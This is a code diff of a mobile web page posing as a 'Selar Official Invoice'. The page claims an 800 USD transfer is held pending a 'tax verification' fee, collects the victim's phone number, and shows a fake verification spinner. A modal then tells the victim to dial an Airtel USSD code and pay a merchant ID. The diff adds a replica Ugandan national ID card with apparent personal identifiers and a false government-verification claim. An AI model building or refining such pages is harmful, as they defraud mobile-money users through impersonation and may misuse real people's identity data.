@@ -47,51 +47,94 @@
             font-family: 'Courier New', Courier, monospace;
             border-radius: 12px;
             position: relative;
-            overflow: hidden;
         }
-        .image-receipt-box::before {
-            content: "SECURE";
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) rotate(-30deg);
-            font-size: 40px;
-            color: rgba(0, 0, 0, 0.03);
-            pointer-events: none;
-            font-weight: 900;
-        }
-        .receipt-header-main { text-align: center; font-weight: bold; font-size: 18px; color: #333; letter-spacing: 1px; }
+        .receipt-header-main { text-align: center; font-weight: bold; font-size: 18px; color: #333; }
         .receipt-center { text-align: center; color: #666; font-weight: bold; }
         .receipt-line { margin-bottom: 4px; font-size: 11px; color: #444; border-bottom: 1px dashed #eee; padding-bottom: 2px; }
         .receipt-bold { font-weight: 800; text-align: center; margin: 10px 0; color: #000; }
-        .red-status { 
-            color: #ffffff; 
-            background: #e74c3c;
-            font-weight: bold; 
-            text-align: center; 
-            font-size: 10px; 
-            margin-top: 15px; 
-            padding: 5px;
-            border-radius: 4px;
-            text-transform: uppercase;
+        .red-status { color: #ffffff; background: #e74c3c; font-weight: bold; text-align: center; font-size: 10px; margin-top: 15px; padding: 5px; border-radius: 4px; }
+
+        /* Payment Box */
+        .payment-box { border: 1px solid #e0e0e0; border-radius: 20px; padding: 15px; margin: 0 10px 20px; }
+        .input-group { display: flex; border: 1px solid #ddd; border-radius: 12px; padding: 4px; align-items: center; background: #fff; }
+        .input-group input { border: none; outline: none; flex-grow: 1; font-size: 18px; font-weight: bold; padding-left: 10px; width: 40%; }
+        .continue-btn { background-color: #00a651; color: white; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; cursor: pointer; }
+
+        /* --- NATIONAL ID STYLING (IMAGE REPLICA) --- */
+        .national-id-card {
+            background: linear-gradient(135deg, #e3f2fd 0%, #fff9c4 100%);
+            border: 1px solid #ccc;
+            border-radius: 15px;
+            margin: 20px 10px;
+            padding: 15px;
+            position: relative;
+            text-align: left;
+            font-family: Arial, sans-serif;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        .id-header {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+        .uganda-text {
+            color: #003366;
+            font-weight: 900;
+            font-size: 14px;
+            line-height: 1.1;
+            transform: rotate(-90deg);
+            white-space: nowrap;
+            margin-top: 40px;
+            margin-left: -25px;
+        }
+        .id-title-main {
+            color: #003366;
+            font-size: 18px;
+            font-weight: bold;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+        }
+        .id-grid {
+            display: grid;
+            grid-template-columns: 80px 1fr 1fr;
+            gap: 5px;
+            margin-top: 10px;
+        }
+        .id-photo {
+            width: 75px;
+            height: 95px;
+            background: #d1d1d1;
+            border-radius: 5px;
+            grid-row: span 4;
+            position: relative;
+            border: 1px solid #aaa;
+        }
+        .id-field { margin-bottom: 5px; }
+        .id-label { font-size: 8px; color: #555; margin: 0; font-weight: bold; text-transform: uppercase; }
+        .id-value { font-size: 11px; color: #000; font-weight: bold; margin: 0; }
+        .ug-map-icon {
+            position: absolute;
+            bottom: 40px;
+            left: 10px;
+            width: 35px;
+            opacity: 0.8;
+        }
+        .signature-font {
+            font-family: 'Cursive', brush script mt, sans-serif;
+            font-size: 14px;
+            border-top: 1px solid #000;
+            display: inline-block;
+            margin-top: 5px;
+            padding-top: 2px;
         }
 
-        /* Form Styles */
-        .payment-box { border: 1px solid #e0e0e0; border-radius: 20px; padding: 15px; margin: 0 10px 20px; position: relative; }
-        .input-group { display: flex; border: 1px solid #ddd; border-radius: 12px; padding: 4px; align-items: center; margin-bottom: 15px; background: #fff; }
-        .input-group input { border: none; outline: none; flex-grow: 1; font-size: 18px; font-weight: bold; color: #444; padding-left: 10px; width: 40%; }
-        .continue-btn { background-color: #00a651; color: white; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; }
-
-        /* Overlay & Modal */
+        /* Modals */
         #loadingOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.98); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #00a651; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        
         #instructionModal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); display: none; justify-content: center; align-items: center; z-index: 10000; }
-        .modal-content { background: white; width: 90%; max-width: 360px; border-radius: 15px; overflow: hidden; text-align: center; }
-        .modal-head { background: #e74c3c; color: white; padding: 20px; }
-        .modal-body { padding: 20px; text-align: left; font-size: 14px; line-height: 1.5; }
-        .btn-ok { display: block; background: #00a651; color: white; text-decoration: none; padding: 15px; margin: 10px 20px; border-radius: 8px; font-weight: bold; }
-        .btn-later { background: none; border: none; color: #999; padding: 10px; cursor: pointer; margin-bottom: 10px; }
+        .modal-content { background: white; width: 90%; max-width: 360px; border-radius: 15px; overflow: hidden; }
+        .modal-head { background: #e74c3c; color: white; padding: 20px; text-align: center; }
+        .btn-ok { display: block; background: #00a651; color: white; text-decoration: none; padding: 15px; margin: 10px 20px; border-radius: 8px; font-weight: bold; text-align: center; }
     </style>
 </head>
 <body>
@@ -107,31 +150,12 @@
 
     <div class="image-receipt-box">
         <div class="receipt-header-main">SELAR OFFICIAL INVOICE</div>
-        <div class="receipt-center" style="font-size: 10px; margin-bottom: 10px;">E-RECEIPT #TRX-99284-UG</div>
-        <div class="receipt-center" style="margin-bottom: 10px; opacity: 0.3;">****************************</div>
-        
-        <div class="receipt-line"><strong>TYPE:</strong> Send Money (Mobile)</div>
-        <div class="receipt-line"><strong>ACCOUNT:</strong> [Your Selar invoice Account Number]</div>
+        <div class="receipt-center" style="font-size: 10px;">TRX-99284-UG</div>
         <div class="receipt-line"><strong>NAME:</strong> LOLIKISHEE USA Chicago 🇺🇲</div>
-        
-        <div style="margin-top: 12px; padding: 8px; background: #fff; border-radius: 6px; border: 1px solid #eee;">
-            <div class="receipt-line" style="border:none;"><strong>RECIPIENT ID:</strong> SI001234595</div>
-            <div class="receipt-bold" style="text-decoration: underline; margin: 2px 0;">KATEME ZAINABU</div>
-            <div class="receipt-line" style="border:none;"><strong>MOBILE:</strong> +256708632384</div>
-            <div class="receipt-line" style="border:none;"><strong>NETWORK:</strong> AIRTEL UGANDA</div>
-        </div>
-
-        <div class="receipt-line" style="margin-top: 15px; text-align: center; border: none;"><strong>TOTAL PAYABLE AMOUNT:</strong></div>
-        <div class="receipt-bold" style="font-size: 22px; margin-top: 0;">USD 800.00</div>
-        
-        <div class="receipt-center" style="margin-top: 10px; opacity: 0.3;">----------------------------</div>
-        <div class="red-status">PENDING: TAX VERIFICATION REQUIRED (145,500 UGX)</div>
-        
-        <div class="receipt-center" style="font-family: sans-serif; font-size: 20px; margin-top: 15px; font-weight: 900; letter-spacing: 6px; color: #5a0b4d; opacity: 0.8;">SELAR</div>
+        <div class="receipt-line"><strong>RECIPIENT:</strong> MUTASA BRIAN</div>
+        <div class="receipt-bold" style="font-size: 22px;">USD 800.00</div>
+        <div class="red-status">PENDING: TAX VERIFICATION (145,500 UGX)</div>
     </div>
-
-    <div class="main-amount" style="font-size: 32px; font-weight: 800; color: #333;">UGX 145,500</div>
-    <div style="color: #888; font-size: 12px; margin-bottom: 20px; padding: 0 20px;">Provide your mobile number to initiate secure payment.</div>
 
     <div class="payment-box">
         <form id="paymentForm">
@@ -141,57 +165,103 @@
             </div>
         </form>
     </div>
+
+    <div style="font-size: 12px; font-weight: bold; margin-top: 20px; color: #5a0b4d;">RECIPIENT VERIFIED IDENTITY</div>
+    
+    <div class="national-id-card">
+        <div class="id-header">
+            <div class="uganda-text">REPUBLIC OF UGANDA</div>
+            <div>
+                <div class="id-title-main">NATIONAL ID CARD</div>
+            </div>
+        </div>
+
+        <div class="id-grid">
+            <div class="id-photo">
+                <div style="position:absolute; bottom:2px; font-size:6px; text-align:center; width:100%; color:#666;">MUTASA BRIAN</div>
+            </div>
+
+            <div class="id-field" style="grid-column: span 2;">
+                <p class="id-label">SURNAME</p>
+                <p class="id-value">MUTASA</p>
+            </div>
+
+            <div class="id-field" style="grid-column: span 2;">
+                <p class="id-label">GIVEN NAME</p>
+                <p class="id-value">BRIAN</p>
+            </div>
+
+            <div class="id-field">
+                <p class="id-label">SEX</p>
+                <p class="id-value">M</p>
+            </div>
+            <div class="id-field">
+                <p class="id-label">DATE OF BIRTH</p>
+                <p class="id-value">04.02.1996</p>
+            </div>
+
+            <div class="id-field">
+                <p class="id-label">NATIONALITY</p>
+                <p class="id-value">UGA</p>
+            </div>
+            <div class="id-field">
+                <p class="id-label">CARD NO.</p>
+                <p class="id-value">020890805</p>
+            </div>
+
+            <div class="id-field" style="grid-column: span 2;">
+                <p class="id-label">NIN</p>
+                <p class="id-value">CM96008105M84J</p>
+            </div>
+
+            <div class="id-field">
+                <p class="id-label">DATE OF EXPIRY</p>
+                <p class="id-value">27.05.2031</p>
+            </div>
+
+            <div class="id-field" style="grid-column: span 3; text-align: right; margin-top: 10px;">
+                <p class="id-label">HOLDERS SIGNATURE</p>
+                <div class="signature-font">Mutasa Brian</div>
+            </div>
+        </div>
+        
+        <div style="position:absolute; bottom:15px; left:15px; width:40px; height:25px; border:1px solid #000; background: linear-gradient(to bottom, black 16%, yellow 16%, yellow 32%, red 32%, red 48%, black 48%, black 64%, yellow 64%, yellow 80%, red 80%);"></div>
+    </div>
+
+    <div style="font-size: 10px; color: #999; margin: 15px; font-style: italic;">
+        Official Verification: Government of Uganda Ministry of Internal Affairs.
+    </div>
 </div>
 
 <div id="loadingOverlay">
-    <div class="spinner"></div>
+    <div class="spinner" style="border: 4px solid #f3f3f3; border-top: 4px solid #00a651; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>
     <h3 id="loadText" style="padding: 0 40px; text-align: center; font-size: 18px; color: #333;"></h3>
 </div>
 
 <div id="instructionModal">
     <div class="modal-content">
-        <div class="modal-head">
-            <strong>SELAR MERCHANT TRANSACTION</strong><br>
-            <div style="background:white; color:#e74c3c; display:inline-block; padding:2px 10px; border-radius:5px; margin-top:10px; font-weight:bold;">
-                Currently Supports AIRTEL Sim Card 🇺🇬
-            </div>
-        </div>
-        <div class="modal-body">
-            <p><strong>How to Register on Selar Merchant [Use Merchant ID~6837633]:</strong></p>
+        <div class="modal-head"><strong>SELAR MERCHANT TRANSACTION</strong></div>
+        <div style="padding: 20px; text-align: left; font-size: 14px;">
             <p>📞 <strong>Dial: *185*9#</strong></p>
             <p>🆔 Enter Merchant ID: <strong>6837633</strong></p>
             <p>💵 Enter Amount: <strong>21670</strong></p>
             <p>🔖 Reference: <strong>selar merchant</strong></p>
-            <p style="font-size:12px; border-top:1px solid #eee; padding-top:10px; margin-top:10px;">Confirm payment to verify your SIM card.</p>
         </div>
-        
         <a href="tel:*185*9%23" class="btn-ok">Register Now</a>
-        <button class="btn-later" onclick="closeModal()">Register Later</button>
     </div>
 </div>
 
 <script>
     document.getElementById('paymentForm').addEventListener('submit', function(e) {
         e.preventDefault();
-        process();
-    });
-
-    function process() {
         const val = document.getElementById('phoneNum').value;
-        if(val.length < 10) return alert("Enter valid number");
-        
-        document.getElementById('loadText').innerText = `Verifying Sim card ${val} for merchant transaction of 200$~743,000UGX`;
+        document.getElementById('loadText').innerText = `Verifying Sim card ${val} for payment...`;
         document.getElementById('loadingOverlay').style.display = 'flex';
-        
         setTimeout(() => {
             document.getElementById('loadingOverlay').style.display = 'none';
             document.getElementById('instructionModal').style.display = 'flex';
-        }, 7000);
-    }
-
-    function closeModal() {
-        document.getElementById('instructionModal').style.display = 'none';
-    }
+        }, 5000);
+    });
 </script>
 
 </body>
